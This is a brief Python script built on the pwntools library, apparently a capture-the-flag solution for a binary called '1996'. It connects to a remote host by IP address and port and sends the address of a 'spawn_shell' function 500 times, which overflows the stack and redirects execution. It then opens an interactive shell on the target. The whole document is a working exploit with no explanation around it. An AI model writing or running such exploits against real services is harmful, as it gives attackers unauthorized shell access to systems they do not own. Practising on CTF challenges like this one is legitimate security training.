from pwn import *

p = remote('35.207.132.47', 22227)
elf = ELF('./1996')

spawn_shell = 0x400897
p.recvuntil('read? ')

payload = p64(spawn_shell)

p.sendline(payload*500)
p.recv(1024)
p.interactive()